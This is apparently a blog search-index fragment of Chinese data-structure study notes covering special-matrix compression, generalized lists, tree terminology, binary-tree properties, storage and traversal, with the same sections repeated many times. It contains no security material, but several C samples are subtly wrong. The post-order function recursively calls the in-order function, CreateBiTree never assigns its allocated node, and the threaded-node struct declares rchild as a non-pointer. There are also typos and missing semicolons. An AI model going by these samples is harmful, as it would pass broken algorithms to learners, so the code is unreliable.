稀疏矩阵矩阵中非零元素的个数较少（一般小于5%） 特点：大多数元素为0。 常用存储方法：只记录每一非零元素（i，j，aij），节省空间但丧失随机存取功能。 ​ 顺序存储：三元组表 ​ 链式存储：十字（正交）链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#特殊矩阵的压缩存储"},{"categories":["notice"],"content":"\r特殊矩阵的压缩存储\r压缩存储若多个数据元素的值都相同，则只分配一个元素值的储存空间，且零元素不占储存空间。 什么样的矩阵能压缩存储一些特殊矩阵：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵 对称矩阵特点：在nxn的矩阵a中，满足性质aij=aji（1\u003c=i,j\u003c=n） 存储方法：只能存储上（或者下）三角（包括主对角线）的数据元素。共占n(n+1)/2个元素空间。 三角矩阵特点：对角线以下（或者以上）的数据元素（不包括对角线）全部为常数c。 储存方法：重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[1...n(n+1)/2+1] 对角矩阵(带状矩阵)特点：在nxn的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内——L对角矩阵。 储存方法： 稀疏矩阵矩阵中非零元素的个数较少（一般小于5%） 特点：大多数元素为0。 常用存储方法：只记录每一非零元素（i，j，aij），节省空间但丧失随机存取功能。 ​ 顺序存储：三元组表 ​ 链式存储：十字（正交）链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#压缩存储"},{"categories":["notice"],"content":"\r特殊矩阵的压缩存储\r压缩存储若多个数据元素的值都相同，则只分配一个元素值的储存空间，且零元素不占储存空间。 什么样的矩阵能压缩存储一些特殊矩阵：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵 对称矩阵特点：在nxn的矩阵a中，满足性质aij=aji（1\u003c=i,j\u003c=n） 存储方法：只能存储上（或者下）三角（包括主对角线）的数据元素。共占n(n+1)/2个元素空间。 三角矩阵特点：对角线以下（或者以上）的数据元素（不包括对角线）全部为常数c。 储存方法：重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[1...n(n+1)/2+1] 对角矩阵(带状矩阵)特点：在nxn的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内——L对角矩阵。 储存方法： 稀疏矩阵矩阵中非零元素的个数较少（一般小于5%） 特点：大多数元素为0。 常用存储方法：只记录每一非零元素（i，j，aij），节省空间但丧失随机存取功能。 ​ 顺序存储：三元组表 ​ 链式存储：十字（正交）链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#什么样的矩阵能压缩存储"},{"categories":["notice"],"content":"\r特殊矩阵的压缩存储\r压缩存储若多个数据元素的值都相同，则只分配一个元素值的储存空间，且零元素不占储存空间。 什么样的矩阵能压缩存储一些特殊矩阵：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵 对称矩阵特点：在nxn的矩阵a中，满足性质aij=aji（1\u003c=i,j\u003c=n） 存储方法：只能存储上（或者下）三角（包括主对角线）的数据元素。共占n(n+1)/2个元素空间。 三角矩阵特点：对角线以下（或者以上）的数据元素（不包括对角线）全部为常数c。 储存方法：重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[1...n(n+1)/2+1] 对角矩阵(带状矩阵)特点：在nxn的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内——L对角矩阵。 储存方法： 稀疏矩阵矩阵中非零元素的个数较少（一般小于5%） 特点：大多数元素为0。 常用存储方法：只记录每一非零元素（i，j，aij），节省空间但丧失随机存取功能。 ​ 顺序存储：三元组表 ​ 链式存储：十字（正交）链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#对称矩阵"},{"categories":["notice"],"content":"\r特殊矩阵的压缩存储\r压缩存储若多个数据元素的值都相同，则只分配一个元素值的储存空间，且零元素不占储存空间。 什么样的矩阵能压缩存储一些特殊矩阵：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵 对称矩阵特点：在nxn的矩阵a中，满足性质aij=aji（1\u003c=i,j\u003c=n） 存储方法：只能存储上（或者下）三角（包括主对角线）的数据元素。共占n(n+1)/2个元素空间。 三角矩阵特点：对角线以下（或者以上）的数据元素（不包括对角线）全部为常数c。 储存方法：重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[1...n(n+1)/2+1] 对角矩阵(带状矩阵)特点：在nxn的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内——L对角矩阵。 储存方法： 稀疏矩阵矩阵中非零元素的个数较少（一般小于5%） 特点：大多数元素为0。 常用存储方法：只记录每一非零元素（i，j，aij），节省空间但丧失随机存取功能。 ​ 顺序存储：三元组表 ​ 链式存储：十字（正交）链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#三角矩阵"},{"categories":["notice"],"content":"\r特殊矩阵的压缩存储\r压缩存储若多个数据元素的值都相同，则只分配一个元素值的储存空间，且零元素不占储存空间。 什么样的矩阵能压缩存储一些特殊矩阵：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵 对称矩阵特点：在nxn的矩阵a中，满足性质aij=aji（1\u003c=i,j\u003c=n） 存储方法：只能存储上（或者下）三角（包括主对角线）的数据元素。共占n(n+1)/2个元素空间。 三角矩阵特点：对角线以下（或者以上）的数据元素（不包括对角线）全部为常数c。 储存方法：重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[1...n(n+1)/2+1] 对角矩阵(带状矩阵)特点：在nxn的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内——L对角矩阵。 储存方法： 稀疏矩阵矩阵中非零元素的个数较少（一般小于5%） 特点：大多数元素为0。 常用存储方法：只记录每一非零元素（i，j，aij），节省空间但丧失随机存取功能。 ​ 顺序存储：三元组表 ​ 链式存储：十字（正交）链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#对角矩阵带状矩阵"},{"categories":["notice"],"content":"\r特殊矩阵的压缩存储\r压缩存储若多个数据元素的值都相同，则只分配一个元素值的储存空间，且零元素不占储存空间。 什么样的矩阵能压缩存储一些特殊矩阵：对称矩阵，对角矩阵，三角矩阵，稀疏矩阵 对称矩阵特点：在nxn的矩阵a中，满足性质aij=aji（1\u003c=i,j\u003c=n） 存储方法：只能存储上（或者下）三角（包括主对角线）的数据元素。共占n(n+1)/2个元素空间。 三角矩阵特点：对角线以下（或者以上）的数据元素（不包括对角线）全部为常数c。 储存方法：重复元素c共享一个元素存储空间，共占用n(n+1)/2+1个元素空间：sa[1...n(n+1)/2+1] 对角矩阵(带状矩阵)特点：在nxn的方阵中，非零元素集中在主对角线及其两侧共L(奇数)条对角线的带状区域内——L对角矩阵。 储存方法： 稀疏矩阵矩阵中非零元素的个数较少（一般小于5%） 特点：大多数元素为0。 常用存储方法：只记录每一非零元素（i，j，aij），节省空间但丧失随机存取功能。 ​ 顺序存储：三元组表 ​ 链式存储：十字（正交）链表 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:2","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#稀疏矩阵"},{"categories":["notice"],"content":"\r广义表n个表元素组成的有限序列，记作LS=(a0,a1.a2......,an-1) LS是表名，ai是表元素，它可以是表（称为子表），可以是数据元素（称为原子）。 n为表的长度，n=0的广义表为空表。 广义表和线性表的区别 线性表的成分都是结构上不可分的单元素 广义表的成分可以是单元素，可以是有结构的表 线性表是一种特殊的广义表 广义表不一定是线性表，也不一定是线性结构 广义表的基本运算(1)求表头GetHead(L)：非空广义表的第一个元素，可以是一个单元素，也可以是一个子表。 (2)求表尾GetTail(L)：非空广义表除去表头元素以外其他元素所构成的表，表尾一定是一个表。 广义表特点 有次序性：一个直接前驱和一个直接后继 有长度=表中元素个数 有深度=表中括号重数 可递归：自己可以作为自己的子表 可共享：可以为其他广义表所共享 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#广义表"},{"categories":["notice"],"content":"\r广义表n个表元素组成的有限序列，记作LS=(a0,a1.a2......,an-1) LS是表名，ai是表元素，它可以是表（称为子表），可以是数据元素（称为原子）。 n为表的长度，n=0的广义表为空表。 广义表和线性表的区别 线性表的成分都是结构上不可分的单元素 广义表的成分可以是单元素，可以是有结构的表 线性表是一种特殊的广义表 广义表不一定是线性表，也不一定是线性结构 广义表的基本运算(1)求表头GetHead(L)：非空广义表的第一个元素，可以是一个单元素，也可以是一个子表。 (2)求表尾GetTail(L)：非空广义表除去表头元素以外其他元素所构成的表，表尾一定是一个表。 广义表特点 有次序性：一个直接前驱和一个直接后继 有长度=表中元素个数 有深度=表中括号重数 可递归：自己可以作为自己的子表 可共享：可以为其他广义表所共享 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#广义表和线性表的区别"},{"categories":["notice"],"content":"\r广义表n个表元素组成的有限序列，记作LS=(a0,a1.a2......,an-1) LS是表名，ai是表元素，它可以是表（称为子表），可以是数据元素（称为原子）。 n为表的长度，n=0的广义表为空表。 广义表和线性表的区别 线性表的成分都是结构上不可分的单元素 广义表的成分可以是单元素，可以是有结构的表 线性表是一种特殊的广义表 广义表不一定是线性表，也不一定是线性结构 广义表的基本运算(1)求表头GetHead(L)：非空广义表的第一个元素，可以是一个单元素，也可以是一个子表。 (2)求表尾GetTail(L)：非空广义表除去表头元素以外其他元素所构成的表，表尾一定是一个表。 广义表特点 有次序性：一个直接前驱和一个直接后继 有长度=表中元素个数 有深度=表中括号重数 可递归：自己可以作为自己的子表 可共享：可以为其他广义表所共享 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#广义表的基本运算"},{"categories":["notice"],"content":"\r广义表n个表元素组成的有限序列，记作LS=(a0,a1.a2......,an-1) LS是表名，ai是表元素，它可以是表（称为子表），可以是数据元素（称为原子）。 n为表的长度，n=0的广义表为空表。 广义表和线性表的区别 线性表的成分都是结构上不可分的单元素 广义表的成分可以是单元素，可以是有结构的表 线性表是一种特殊的广义表 广义表不一定是线性表，也不一定是线性结构 广义表的基本运算(1)求表头GetHead(L)：非空广义表的第一个元素，可以是一个单元素，也可以是一个子表。 (2)求表尾GetTail(L)：非空广义表除去表头元素以外其他元素所构成的表，表尾一定是一个表。 广义表特点 有次序性：一个直接前驱和一个直接后继 有长度=表中元素个数 有深度=表中括号重数 可递归：自己可以作为自己的子表 可共享：可以为其他广义表所共享 ","date":"2023-12-19","objectID":"/data_structure_notes/:4:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#广义表特点"},{"categories":["notice"],"content":"\r0x5树和二叉树树：是n个结点的有限集，它或为空树；或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点可分为m（m\u003e0）个互不相交的有限集T1，T2，…,Tm其中每一个结合本身又是一棵树 ，并且称为根的子树（SubTree） 树的其他表示方式嵌套集合，凹入表示，广义表 基本术语\r根——根结点（无前驱） 叶子——终端结点（无后继） 森林——指m棵不相交的树的集合 一棵树可以看成是一个特殊的森林，但森林不一定是树（给森林中的各子树加上一个双亲结点，森林就成了树） 有序树——结点各子树从左至右有序，不能互换（左为第一） 无序树——结点各子树课互换位置 双亲 孩子 兄弟 堂兄弟 祖先 子孙 结点——树的数据元素 结点的度——结点挂接的子树数 结点的层次——从根到该结点的层数 终端结点——度为0的结点 分支结点——度不为0的结点 树的度——所有结点度中的最大值 树的深度——所有结点中最大的层数 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#0x5树和二叉树"},{"categories":["notice"],"content":"\r0x5树和二叉树树：是n个结点的有限集，它或为空树；或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点可分为m（m\u003e0）个互不相交的有限集T1，T2，…,Tm其中每一个结合本身又是一棵树 ，并且称为根的子树（SubTree） 树的其他表示方式嵌套集合，凹入表示，广义表 基本术语\r根——根结点（无前驱） 叶子——终端结点（无后继） 森林——指m棵不相交的树的集合 一棵树可以看成是一个特殊的森林，但森林不一定是树（给森林中的各子树加上一个双亲结点，森林就成了树） 有序树——结点各子树从左至右有序，不能互换（左为第一） 无序树——结点各子树课互换位置 双亲 孩子 兄弟 堂兄弟 祖先 子孙 结点——树的数据元素 结点的度——结点挂接的子树数 结点的层次——从根到该结点的层数 终端结点——度为0的结点 分支结点——度不为0的结点 树的度——所有结点度中的最大值 树的深度——所有结点中最大的层数 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#树的其他表示方式"},{"categories":["notice"],"content":"\r0x5树和二叉树树：是n个结点的有限集，它或为空树；或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点可分为m（m\u003e0）个互不相交的有限集T1，T2，…,Tm其中每一个结合本身又是一棵树 ，并且称为根的子树（SubTree） 树的其他表示方式嵌套集合，凹入表示，广义表 基本术语\r根——根结点（无前驱） 叶子——终端结点（无后继） 森林——指m棵不相交的树的集合 一棵树可以看成是一个特殊的森林，但森林不一定是树（给森林中的各子树加上一个双亲结点，森林就成了树） 有序树——结点各子树从左至右有序，不能互换（左为第一） 无序树——结点各子树课互换位置 双亲 孩子 兄弟 堂兄弟 祖先 子孙 结点——树的数据元素 结点的度——结点挂接的子树数 结点的层次——从根到该结点的层数 终端结点——度为0的结点 分支结点——度不为0的结点 树的度——所有结点度中的最大值 树的深度——所有结点中最大的层数 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:0","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本术语"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#二叉树"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 遍历算法分析 时间复杂度：O(n) //每个结点之访问一次 空间效率： O(n) //栈占用的最大辅助空间 非递归遍历以中序遍历为例 使用栈来实现 Status InOrderTraverse(BiTree T){ BiTree p; InitStack(S); p=T; while(p || !StackEmpty(S)){ if(p) {Push(S,p); p=p-\u003elchild;} else {Pop(S,q); printf(\"%c\",q-\u003edata); p=q-\u003erchild;} }//while return OK; } 层次遍历对于一颗二叉树，从根结点开始，按从上到下、从左到右的顺序访问每一个结点。每个结点仅仅访问一次。 使用队列来实现 循环队列类型定义： typedef struct{ BTNode data[MaxSize]; //存放队中元素 int front, rear; //队头和队尾指针 }SqQueue //顺序循环队列类型 层次遍历算法： void LevelOrder(BTNode *b){ BTNode *p; SqQueue *qu; InitQueue(qu); enQueue(qu,b); while(!QueueEmpty(qu)){ deQueue(qu,p); printf(\"%c\",p-\u003edata); if(p-\u003elchild!=NULL) enQueue(qu,p-\u003elchild); if(p-\u003erchild!=NULL) enQueue(qu,p-\u003erchild)； } } 遍历算法的应用\r创建二叉树按先序遍历序列建立二叉树的二叉链表 对下图所示二叉树，按下列顺序读入字符： ABC##DE#G##F### Status CreateBiTree(BiTree \u0026T){ scanf(\u0026ch); if(ch==\"#\") T = NULL; else{ if(!(BiTNode *)malloc(sizeof(BiTNode))) exit(OVERFLOW); T-\u003edata = ch; CreateBiTree(T-\u003elchild); CreateBiTree(T-\u003erchild); } return OK; } 复制二叉树 int Copy(BiTree T, BiTree \u0026NewT){ if(T==NULL){ NewT=NULL; return 0; } else{ NewT=new BiTNode; NewT-\u003edata=T-\u003edata; Copy(T-\u003elChild, NewT-\u003elchild) Copy(T-\u003erChild, NewT-\u003erchild) } } 计算二叉树深度 int Depth(BiTree){ if(T==NULL) return 0; else{ m=Depth(T-\u003elChild); n=Depth(T-\u003erChild); if(m\u003en) return(m+1); else return(n+1);//比较左右子树最大深度并+1 } } 计算二叉树结点总数 int NodeCount(BiTree T){ if(T==NULL) return 0; else return NodeCount(T-\u003elchild)+NodeCount(T-\u003erchild)+1; } 计算二叉树叶子结点总数 int LeadCount(BiTree T){ if(T==NULL) return 0; if(T-\u003elchild==NULL\u0026\u0026T-\u003erchild==NULL) return 1; else return LeafCount(T-\u003elchild)+LeafCount(T-\u003erchild); } 线索二叉树利用二叉链表中的空指针域： 如果某个个结点的左孩子为空，则将空的左孩子指针域改为指向其前驱；如果某结点的右孩子为空，则将空的右孩子指针域改为指向其后继，这种改变指向的指针称为“线索”，加上了线索的二叉树称为线索二叉树（Threaded Binary Tree）。 为区分lchild和rchild指针是指向孩子的指针还是指向前驱或者后继的指针，对二叉链表中每个结点增设两个标志域ltag和rtag，并约定： ltag=0 lchild指向该结点的左孩子 ltag=1 lchild指向该结点的前驱 rtag=0 rchild指向该结点的右孩子 rtag=1 rchild指向该结点的后继 结点的结构： typedef struct BiThrNode{ int data; int ltag,rtag; struct BiThrNode *lchild,rchild; } 为避免第一个结点和最后一个结点悬空 ","date":"2023-12-19","objectID":"/data_structure_notes/:5:1","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#基本特点"},{"categories":["notice"],"content":"\r二叉树是n（n\u003e=0）个结点所构成的集合，它或为空树，或为非空树，对于非空树T： 有且仅有一个称之为根的结点 除根结点以外的其余结点分为两个互不相交的子集T1和T2，分别成为T的左子树和右子树，且T1和T2本身又都是二叉树 基本特点： 结点的度\u003c=2 有序树（子树有序，不能颠倒） 二叉树可以是空集合，根可以有空的左子树或者空的右子树 为什么要用二叉树： 结构最简单，规律性最强 可以证明，所有树都能转为唯一对应的二叉树，不失一般性。 普通树若不转化为二叉树，运算很难实现 注： 二叉树不是树的特殊情况，这是两个概念 二叉树结点的子树分为左子树和右子树，而树是不区分左右次序的 **性质1：**在二叉树的第i层上至多有2^(i-1)个结点（至少有1个结点） **性质2：**深度为k的二叉树至多有2^k-1个结点（至少有k个结点） **性质3：**对于任何一棵二叉树，若2度的结点数有n2个，则叶子数n0必定为n2+1（即n0=n2+1） 案例6.1：数据压缩问题将数据文件转换成由0、1组成的二进制串，称之为编码 案例6.2：利用二叉树求解表达式的值以二叉树表示表达式的递归定义如下： （1）若表达式为数或简单变量，则相应二叉树中仅有一个根结点，其数据域存放该表达式信息； （2）若表达式“第一操作数 运算符 第二操作数”的形式，则相应的二叉树中以左子树表示第一操作数，右子树表示第二操作数，根结点的数据域存放运算符（若为一元运算符，则左子树为空），其中，操作数本身有为表达式。 二叉树的抽象数据类型定义\r二叉树的性质\r满二叉树\r满二叉树一定是完全二叉树，完全二叉树不一定是满二叉树 完全二叉树\r注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树 特点： 叶子只可能分布在层次最大的两层上 对任一结点，如果其右子树的最大层次为i，其左子树的最大层必为i或i+1 完全二叉树性质\r二叉树的存储结构\r顺序存储实现：按满二叉树的结点层次编号，一次存放二叉树中的数据元素 //二叉树顺序存储表示 #define MAXSIZE 100 Typedef TElemType SqBiTree[MAXSIZE] SqBiTree bt; 特点：结点间关系蕴含再其存储位置中，浪费空间，适于存满二叉树和完全二叉树 链式存储\r二叉链表 typedef struct BiNode{ TElem Type data; struct BiNode *Lchild,*rchild; }BiNode,*BiTree; 三叉链表 遍历二叉树**遍历定义：**顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次。 **遍历目的：**得到树中的所有结点的一个线性排列。 **遍历用途：**它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。 **遍历方法：**依次遍历二叉树中的三个部分，便是遍历了整个二叉树。 若规定先左后右，则只有三种情况： 递归遍历算法先序遍历 Stauts PreOrderTraverse(BiTree T){ if(T==NULL) return OK; //空二叉树 else{ visit(T); //访问根结点 PreOrderTraverse(T-\u003elchild); //递归遍历左子树 PreOrderTraverse(T-\u003erchild); //递归遍历右子树 } } 中序遍历 Status InOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); visit(T); InOrderTraverse(T-\u003erchild); } } 后序遍历 Status PostOrderTraverse(BiTree T){ if(T==NULL) return OK; else{ InOrderTraverse(T-\u003elchild); InOrderTraverse(T-\u003erchild); visit(T); } } 